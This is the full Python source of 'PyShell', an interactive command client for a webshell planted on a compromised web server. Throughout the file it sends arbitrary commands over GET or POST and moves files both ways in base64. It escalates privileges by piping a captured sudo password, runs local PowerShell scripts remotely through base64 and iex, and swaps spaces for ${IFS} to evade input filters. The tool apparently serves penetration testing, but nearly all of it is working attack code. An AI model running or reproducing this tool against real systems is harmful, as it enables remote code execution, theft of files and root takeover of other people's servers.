#!/usr/bin/python3

import base64
import urllib
import urllib3
import pwinput
import requests
import readline
import argparse
import sys, os, re
import neotermcolor
from sys import argv
from neotermcolor import colored

remote_files = []
autocomplete_pending = False
urllib3.disable_warnings()
TAG_RE = re.compile(r'<[^>]+>')
neotermcolor.readline_always_safe = True

error_patterns = [
    "permission denied",
    "access denied",
    "no tty present",
    "must be run",
    "no such file",
    "not found",
]

def remove_html(text):
    return TAG_RE.sub('', text).strip()

def update_remote_files_list():
    global remote_files, autocomplete_pending
    autocomplete_pending = True
    if system == "windows":
        ls_output = send_command(PIPE + f"(ls {path}).Name", WEBSHELL, HTTP_METHOD, PARAM)
    else:
        ls_output = send_command(PIPE + f"ls {path}", WEBSHELL, HTTP_METHOD, PARAM)
    
    if "<pre>" in ls_output:
        ls_output = str(ls_output).split("<pre>", 1)[1]
        ls_output = str(ls_output).split("</pre>", 1)[0]
        ls_output = remove_html(ls_output)
        remote_files = [f.strip() for f in ls_output.split('\n') if f.strip()]
    autocomplete_pending = False

def completer(text, state):
    global remote_files, autocomplete_pending
    if not remote_files and not autocomplete_pending:
        update_remote_files_list()
    text_lower = text.lower()
    options = [f for f in remote_files if f.lower().startswith(text_lower)]
    if len(options) == 1:
        return options[state]
    else:
        return options[state]
    return None

def is_error_output(output):
    if not output:
        return False
    output_lower = output.lower()
    return any(pattern.lower() in output_lower for pattern in error_patterns)

def send_command(command, webshell, method, param="code"):
    headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
    "Authorization":args.auth, "Cookie":args.cookies, "Content-Type":"application/x-www-form-urlencoded"}
    command = command + " 2>&1"
    params = {param.strip():command.strip()}
    if args.noenc:
        params = urllib.parse.urlencode(params, safe='|!"#$%&/()=?,.-;:_][]}{><')
    else:
        params = urllib.parse.urlencode(params, safe='')
    if (method.upper() == "GET"):
        response = requests.get((webshell), params=params, headers=headers, verify=False)
    elif (method.upper() == "POST"):
        response = requests.post((webshell), data=params, headers=headers, verify=False)
    return response.content.decode(errors="ignore")

if __name__ == "__main__":
    banner = """
  ██████ ▓██   ░██  ██████  ██░ ██ ▓█████  ██▓     ██▓    
 ▓██░  ██▒██░   ██▒██    ▒ ▓██  ██▒▓██    ▓██▒    ▓██▒    
 ▓██░  ██▒ ██  ██░░ ▓███   ▒██████░▒████  ▒██░    ▒██░    
 ▒██████ ▒ ░████▓░  ▒   ██▒░██ ░██ ▒██    ▒██░    ▒██░    
 ▒██▒ ░  ░ ░ ██▒▓░▒██████▒▒░██▒░██▓░█████▒░██████▒░██████▒
 ▒██░ ░  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░▒ ░     ▓██ ░▒░ ░ ░▒    ░ ▒ ░ ░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░░   ░   ▒ ▒ ░░  ░  ░  ░   ░  ░░ ░         ░ ░     ░ ░   
 ░        ░             ░      ░      ░       ░          ░ 

  -------------- by @JoelGMSec & @3v4Si0N ---------------
 """

    print (colored(banner, "green"))
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="Webshell URL", type=str)
    parser.add_argument("method", help="HTTP Method to execute command (GET or POST)", type=str)
    parser.add_argument("-a", "--auth", help="Authorization header to use on each request", type=str)
    parser.add_argument("-c", "--cookies", help="Cookie header to use on each request", type=str)
    parser.add_argument("-p", "--param", default="code", help="Parameter to use with custom WebShell", type=str)
    parser.add_argument("-ne", "--noenc", action="store_true", help="Disable URL encode on key chars")
    parser.add_argument("-np", "--nopre", action="store_true", help="Disable HTML <pre> tags parser")
    parser.add_argument("-pi", "--pipe", action="store_true", help="Pipe all commands after parameter")
    parser.add_argument("-ifs", "--ifs", action="store_true", help="Replace all white spaces with Internal Field Separator")
    parser.add_argument("-su", "--sudo", action="store_true", help="Sudo command execution (Only on Linux hosts)")
    parser.add_argument("-ps", "--PowerShell", action="store_true", help="PowerShell command execution (Only on Windows hosts)")
    args = parser.parse_args()

    sudo_enabled = False
    sudo_password = None
    supersu = False
    original_whoami = None
    root = False
    disable_pw = ("-npw" in argv)
    readline.set_completer(completer)
    readline.parse_and_bind("tab: complete")

    try:
        WEBSHELL = args.url
        HTTP_METHOD = args.method
        PARAM = args.param
        PIPE = ""
        COMMAND_LIST = ["ls", "dir", "cat", "type", "rm", "del", "file"]
        if str(sys.platform) == "linux":
            localslash = "/"
        else:
            localslash = "\\" 
        if args.pipe:
            PIPE = "|"
        whoami = send_command(PIPE + "whoami", WEBSHELL, HTTP_METHOD, PARAM)
        if args.nopre:
            whoami = "<pre>" + whoami + "</pre>"
        if not "<pre>" in whoami:
            print (colored("[!] Command output not found! Exiting..\n", "red"))
            sys.exit()                      
        if "<pre>" in whoami:
            whoami = str(whoami).split("<pre>", 1)[1] ; whoami = str(whoami).split("</pre>", 1)[0]
            whoami = remove_html(whoami)
        original_whoami = whoami   
        hostname = send_command(PIPE + "hostname", WEBSHELL, HTTP_METHOD, PARAM)
        if args.nopre:
            hostname = "<pre>" + hostname + "</pre>"
        if "<pre>" in hostname:
            hostname = str(hostname).split("<pre>", 1)[1] ; hostname = str(hostname).split("</pre>", 1)[0]
            hostname = remove_html(hostname)
        cwd = "" ; slash = "\\"
        if not slash in whoami:
            path = send_command(PIPE + "pwd", WEBSHELL, HTTP_METHOD, PARAM)
            if args.nopre:
                path = "<pre>" + path + "</pre>"
            if "<pre>" in path:
                path = str(path).split("<pre>", 1)[1] ; path = str(path).split("</pre>", 1)[0]
                path = remove_html(path)
            system = "linux" ; slash = "/"
        else:
            path = send_command(PIPE + "cmd /c echo %cd%", WEBSHELL, HTTP_METHOD, PARAM)
            if args.nopre:
                path = "<pre>" + path + "</pre>"
            if "<pre>" in path:
                path = str(path).split("<pre>", 1)[1] ; path = str(path).split("</pre>", 1)[0]
                path = remove_html(path)
            system = "windows" ; whoami = whoami.split("\\")[1]
        update_remote_files_list()

        while True:
            try:
                cinput = (colored(" [PyShell] ", "grey", "on_green")) ; cinput += (colored(" ", "green", "on_blue"))
                cinput += (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip() + " ", "grey", "on_blue"))
                if len(str(path).rstrip()) > 24:
                    shortpath = str(path).rstrip().split(slash)[-3:] ; shortpath = ".." + slash + slash.join(map(str, shortpath))
                    cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(shortpath.rstrip() + " ", "grey", "on_yellow"))
                else:
                    cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(path.rstrip() + " ", "grey", "on_yellow"))
                cinput += (colored(" ", "yellow"))
                command = input(cinput + "\001\033[0m\002")
                
                if args.ifs:
                    command = command.replace(" ","${IFS}")
                    space = "${IFS}"
                if not args.ifs:
                    space = " "
                    
                if command == "exit":
                    if root:
                        root = False
                        supersu = False
                        sudo_enabled = False
                        whoami = original_whoami
                        print()
                    else:
                        print (colored("[!] Exiting..\n", "red"))
                        break
                else:
                    if len(command) == 0:
                        print()
                        continue
                    if not command.split():
                        print()
                        continue
                    if "clear" in command.split()[0] or "cls" in command.split()[0]:
                        os.system("clear")
                        continue

                    if command.startswith("sudo "):
                        if system != "linux":
                            print(colored("[!] Error: sudo is only available on Linux hosts\n", "red"))
                            continue
                        if len(command.split()) < 2:
                            print(colored("[!] Usage: sudo \"command\" or sudo su\n", "red"))
                            continue
                        sudo_command = command[5:].strip()
                        if sudo_command == "su":
                            if not sudo_enabled:
                                print(colored(f"[sudo] password for {str(whoami)}:\n", "red"))
                                if disable_pw:
                                    sudo_password = sudo_pass = input(cinput + "\001\033[0m\002")
                                else:
                                    sudo_pass = pwinput.pwinput(prompt=(cinput + "\001\033[0m\002"))
                                check_sudo = send_command(PIPE + f"echo '{sudo_password}' | sudo -S whoami", WEBSHELL, HTTP_METHOD, PARAM)
                                if "root" in check_sudo:
                                    sudo_enabled = True
                                    whoami = "root"
                                    root = True
                                else:
                                    print(colored("[sudo] Sorry, try again.\n", "red"))
                                    sudo_password = None
                            else:
                                whoami = "root"
                                root = True
                                print()
                        else:
                            if not sudo_enabled:
                                print(colored(f"[sudo] password for {str(whoami)}:\n", "red"))
                                if disable_pw:
                                    sudo_password = sudo_pass = input(cinput + "\001\033[0m\002")
                                else:
                                    sudo_pass = pwinput.pwinput(prompt=(cinput + "\001\033[0m\002"))
                                check_sudo = send_command(PIPE + f"echo '{sudo_password}' | sudo -S whoami", WEBSHELL, HTTP_METHOD, PARAM)
                                if "root" in check_sudo:
                                    sudo_enabled = True
                                    content = send_command(PIPE + f"echo '{sudo_password}' | sudo -S {sudo_command}", WEBSHELL, HTTP_METHOD, PARAM)
                                    if args.nopre:
                                        content = "<pre>" + content + "</pre>"
                                    if "<pre>" in content:
                                        content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                                        content = remove_html(content) + "\n"
                                    if not content:
                                        content = "\n"
                                    if is_error_output(content):
                                        print(colored(content, "red"))
                                    else:
                                        print(colored(content, "white"))
                                else:
                                    print(colored("[sudo] Sorry, try again.\n", "red"))
                                    sudo_password = None
                            else:
                                content = send_command(PIPE + f"echo '{sudo_password}' | sudo -S {sudo_command}", WEBSHELL, HTTP_METHOD, PARAM)
                                if args.nopre:
                                    content = "<pre>" + content + "</pre>"
                                if "<pre>" in content:
                                    content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                                    content = remove_html(content) + "\n"
                                if not content:
                                    content = "\n"
                                if is_error_output(content):
                                    print(colored(content, "red"))
                                else:
                                    print(colored(content, "white"))
                        continue

                    if "supersu" in command.split()[0]:
                        if system != "linux":
                            print(colored("[!] Error: supersu is only available on Linux hosts\n", "red"))
                            continue
                        else:
                            supersu = True
                            root = True
                            whoami = "root"
                            print()
                            continue
                        
                    if "import-ps1" in command.split()[0]:
                        if system != "windows":
                            print(colored("[!] Error: import-ps1 only works on Windows hosts\n", "red"))
                        else:
                            if args.ifs:
                                command = command.replace("${IFS}"," ")
                            if len(command.split()) < 2:
                                print(colored("[!] Usage: import-ps1 \"/path/script.ps1\"\n", "red"))
                            else:
                                localfile = command.split()[1].replace('"','')
                                if not localslash in localfile:
                                    cwd = os.getcwd()
                                    localfile = cwd + localslash + localfile
                                try:
                                    with open(localfile, "r", encoding="utf-8", errors="ignore") as f:
                                        ps1_content = f.read()
                                    filename = os.path.basename(localfile)
                                    base64_content = base64.b64encode(ps1_content.encode('utf-8')).decode('utf-8')
                                    ps_command = f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{base64_content}')) | iex"
                                    result = send_command(PIPE + ps_command, WEBSHELL, HTTP_METHOD, PARAM)
                                    if is_error_output(result):
                                        print(colored(f"[!] Error executing script: {result}\n", "red"))
                                    else:
                                        print(colored(f"[+] File {filename} imported successfully!\n", "green"))      
                                except FileNotFoundError:
                                    print(colored(f"[!] Error: file {localfile} not found!\n", "red"))
                                except Exception as e:
                                    print(colored(f"[!] Error importing script: {str(e)}\n", "red"))
                        continue
                        
                    if "help" in command.split()[0]:
                        print(colored("[+] Available commands:", "green"))
                        print(colored("    upload: Upload a file from local to remote computer", "blue"))
                        print(colored("    download: Download a file from remote to local computer", "blue"))
                        print(colored("    import-ps1: Import PowerShell script on Windows hosts", "blue"))
                        print(colored("    supersu: Force all commands to be executed as root", "blue"))
                        print(colored("    clear/cls: Clear terminal screen", "blue"))
                        print(colored("    exit: Exit from supersu mode or from program\n", "blue"))
                        continue
                        
                    if "upload" in command.split()[0]:
                        if args.ifs:
                            command = command.replace("${IFS}"," ")
                        if len(command.split()) == 1 or len(command.split()) == 2:
                            print (colored("[!] Usage: upload local_file.ext remote_file.ext\n", "red"))
                        else:
                            localfile = command.split()[1]
                            remotefile = command.split()[2]
                            if remotefile == ".":
                                remotefile = command.split()[1]
                            if not slash in remotefile:
                                if remotefile == localfile:
                                    remotesplit = remotefile.split(localslash)[-1]
                                    remotefile = path.rstrip() + slash + remotesplit
                                else:
                                    remotefile = command.split()[2]
                            remotefiletmp = remotefile.rstrip() + ".tmp"
                            if not localslash in localfile:
                                cwd = os.getcwd()
                                print (colored("[+] Uploading file " + cwd + localslash + localfile + " on " + remotefile + "..\n", "green"))
                            else:
                                print (colored("[+] Uploading file " + localfile + " on " + remotefile + "..\n", "green"))
                            try:
                                f = open(localfile, "rb") ; rawfiledata = f.read() ; base64data = base64.b64encode(rawfiledata)
                            except OSError:
                                print (colored("[!] Local file " + localfile + " does not exist!\n", "red"))
                                continue
                            upload = send_command(PIPE + "echo" + space + str(base64data.rstrip(), "utf8") + space +
                            ">" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                            
                            if is_error_output(upload):
                                print(colored(f"[!] Error uploading file: {upload}\n", "red"))
                            else:
                                if system == "linux":
                                    send_command(PIPE + "base64" + space + "-di" + space + remotefile + space + ">" + space + remotefiletmp + space +
                                    ";rm" + space + "-f" + space + remotefile + ";mv" + space + remotefiletmp + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                                if system == "windows":
                                    command = " ; [System.Convert]::FromBase64String($base64) | Set-Content -Encoding Byte "
                                    send_command(PIPE + "$base64 = cat -Encoding UTF8 " + remotefile + command + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                    else:
                        if "download" in command.split()[0]: 
                            if args.ifs:
                                command = command.replace("${IFS}"," ")
                            if len(command.split()) == 1 or len(command.split()) == 2:
                                print (colored("[!] Usage: download remote_file.ext local_file.ext\n", "red"))
                            else:
                                remotefile = command.split()[1]
                                localfile = command.split()[2]
                                if not slash in remotefile:
                                    remotefile = path.rstrip() + slash + command.split()[1]
                                if not localslash in localfile:
                                    cwd = os.getcwd()
                                    if localfile == ".":
                                        localfile = command.split()[1]
                                        localfile = localfile.split(slash)[-1]
                                    print (colored("[+] Downloading file " + remotefile + " on " + cwd + localslash + localfile + "..\n", "green"))
                                else:
                                    print (colored("[+] Downloading file " + remotefile + " on " + localfile + "..\n", "green"))
                                if system == "linux":
                                    base64data = send_command(PIPE + "base64" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM) 
                                if system == "windows":
                                    command = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+remotefile+"'))" 
                                    base64data = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
                                if args.nopre:
                                    base64data = "<pre>" + base64data + "</pre>"
                                if "<pre>" in base64data:
                                    base64data = str(base64data).split("<pre>", 1)[1] ; base64data = str(base64data).split("</pre>", 1)[0]
                                    base64data = remove_html(base64data)
                                
                                if is_error_output(base64data):
                                    print(colored(f"[!] Error downloading file: {base64data}\n", "red"))
                                    continue
                                
                                download = base64.b64decode(base64data.encode("utf8") + b"========")
                                try:
                                    f = open(localfile, "wb") ; f.write(download) ; f.close()
                                except OSError:
                                    print (colored("[!] Error writing " + localfile + ", check path and perms!\n", "red"))
                                    continue
                        else:
                            if "pwd" in command.split()[0]:
                                path = str(path) + "\n"
                                print (colored(path, "white"))
                            else:
                                if "cd" in command.split()[0]:
                                    old_path = path
                                    if args.ifs:
                                        command = command.replace("${IFS}"," ")
                                    if command.split()[1] == ".":
                                        continue
                                    if ".." in command.split()[1]:
                                        path = path.split(slash)[:-1]
                                        path = (slash.join(path))
                                        if not path:
                                            path = slash
                                    else:
                                        if not slash in command.split()[1]:
                                            if path != slash:
                                                path = path.rstrip() + slash + command.split()[1]
                                            if path == slash:
                                                path = path.rstrip() + command.split()[1]
                                        else:
                                            path = command.split()[1]                        
                                        if system == "windows":
                                            check_cmd = PIPE + f"(ls {path}).Name"
                                        else:
                                            check_cmd = PIPE + f"ls {path}"
                                        check_output = send_command(check_cmd, WEBSHELL, HTTP_METHOD, PARAM)
                                        if not check_output or is_error_output(check_output):
                                            if system == "windows":  
                                                print(colored(f"cd: You don't have permission to access {path} on this server", "red"))
                                            else:
                                                print(colored(f"cd: cannot access '{path}': No such file or directory", "red"))
                                            path = old_path
                                    update_remote_files_list()
                                    print()

                                else:
                                    if supersu and root and system == "linux":
                                        old_cmd = command
                                        command = f"su -c '{old_cmd}'"
                                    if command.split()[0] in COMMAND_LIST:
                                        command_array = command.split(" ")
                                        param = ""
                                        for i in list(command_array):
                                            if i.startswith("-"):
                                                param += i + space
                                                command_array.remove(i)
                                        cmd = command_array.pop(0)
                                        if len(command_array) == 0:
                                            relative_path = ""
                                        else:
                                            relative_path = command_array[0]
                                        if not slash in relative_path:
                                            command = cmd + space + param + path.rstrip() + slash + relative_path
                                        content = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
                                        if args.nopre:
                                            content = "<pre>" + content + "</pre>"
                                        if "<pre>" in content:
                                            content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                                            content = remove_html(content) + "\n"
                                        if not content:
                                            content = "\n"
                                        if is_error_output(content):
                                            print(colored(content, "red"))
                                        else:
                                            print(colored(content, "white"))
                                    else:
                                        if args.PowerShell:
                                            content = send_command(PIPE + "powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
                                            if args.nopre:
                                                content = "<pre>" + content + "</pre>"
                                            if "<pre>" in content:
                                                content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                                                content = remove_html(content) + "\n"
                                            if not content:
                                                content = "\n"
                                            if is_error_output(content):
                                                print(colored(content, "red"))
                                            else:
                                                print(colored(content, "white"))  
                                        else:
                                            if sudo_enabled and sudo_password and system == "linux":
                                                content = send_command(PIPE + f"echo '{sudo_password}' | sudo -S {command}", WEBSHELL, HTTP_METHOD, PARAM)
                                                if args.nopre:
                                                    content = "<pre>" + content + "</pre>"
                                                if "<pre>" in content:
                                                    content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                                                    content = remove_html(content) + "\n"
                                                if not content:
                                                    content = "\n"
                                                if is_error_output(content):
                                                    print(colored(content, "red"))
                                                else:
                                                    print(colored(content, "white")) 
                                            else:
                                                content = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
                                                if args.nopre:
                                                    content = "<pre>" + content + "</pre>"
                                                if "<pre>" in content:
                                                    content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                                                    content = remove_html(content) + "\n"
                                                if not content:
                                                    content = "\n"
                                                if is_error_output(content):
                                                    print(colored(content, "red"))
                                                else:
                                                    print(colored(content, "white")) 

            except KeyboardInterrupt:
                print (colored("\n[!] Exiting..\n", "red"))
                break

            except:
                pass

    except Exception as e:
        print(e)
        print (colored("\n[!] Error getting connection!\n", "red"))
